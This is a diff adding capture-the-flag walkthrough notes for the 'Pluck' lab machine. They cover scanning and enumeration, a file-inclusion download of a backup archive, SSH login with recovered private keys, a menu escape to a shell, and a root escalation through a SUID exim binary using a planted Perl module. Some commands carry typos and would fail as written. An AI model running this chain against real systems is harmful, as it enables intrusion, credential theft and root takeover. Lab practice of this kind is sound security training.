@@ -1,0 +1,48 @@
+* sudo netdiscover
+  - gets ip of Pluck
+  
+* nmap -v -sS -T4 <IP>
+  - Found 22, 80, 2206 open
+  
+* http://<IP>
+  - Found contact us page
+  - Found about us page
+  
+* dirb http://<IP>
+  - Found /admin.php
+  - Found /fonts
+  - Found /images
+  - Found /index.php
+  - Found /server-status
+  
+* uniscan -u http://<IP>/ -qweds
+  - Found /backup/backup.tar (intresting)
+  
+* wget http://<IP>/index.php?page=/backups/backup.tar
+  - this downloads the backups.tar file to the local host
+  
+* tar -xvf backup.tar
+  - Found lots in the home/folder
+  - Found /home/paul/keys/id_key (perfect find)
+  
+* ssh -l paul <IP> -i id_key*
+  - id_key4 worked
+  - This brought up a Pdmenu
+  
+* edit file -> ; /bin/bash -> iq
+  - in as pual
+  
+* find /-perm -u=s -type f 2>/dev/null
+  - This looks for SUID
+  - Found exim-4.84.7 (perfect to exploit)
+  
+* cat >/tmp/root.pm << EOF
+  > package root;
+  > use strict;
+  > use warnings;
+  > system("/bin/sh");
+  > EOF
+  
+* PERLSLIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim-4.84.7 -ps
+  #id
+  #cat /root/flag.txt
